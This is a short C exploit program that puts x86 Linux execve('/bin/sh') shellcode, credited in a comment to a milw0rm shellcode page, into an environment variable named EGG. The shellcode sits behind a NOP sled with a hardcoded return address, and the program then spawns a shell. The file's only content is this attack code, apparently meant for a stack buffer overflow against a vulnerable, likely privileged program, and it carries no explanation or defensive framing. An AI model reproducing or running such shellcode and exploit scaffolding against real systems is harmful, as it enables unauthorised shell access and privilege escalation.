#include<stdio.h>
#include<stdlib.h>
#include<string.h>

// shellcode ripped from http://www.milw0rm.com/shellcode/444

char shellcode[]=
"\x31\xc0"                      // xorl         %eax,%eax
"\x50"                          // pushl        %eax
"\x68\x6e\x2f\x73\x68"          // pushl        $0x68732f6e
"\x68\x2f\x2f\x62\x69"          // pushl        $0x69622f2f
"\x89\xe3"                      // movl         %esp,%ebx
"\x99"                          // cltd
"\x52"                          // pushl        %edx
"\x53"                          // pushl        %ebx
"\x89\xe1"                      // movl         %esp,%ecx
"\xb0\x0b"                      // movb         $0xb,%al
"\xcd\x80"                      // int          $0x80
;
#define NOP 0x90

char retaddr[] = "\x08\xce\xff\xff";

main()
{
        char buffer[96];

        memset(buffer, NOP, 96);
        memcpy(buffer, "EGG=", 4);
        memcpy(buffer+4, shellcode, 24);
        memcpy(buffer+88, retaddr, 4);
        memcpy(buffer+92, "\x00\x00\x00\x00", 4);
        putenv(buffer);
        system("/bin/sh");

        return 0;
}


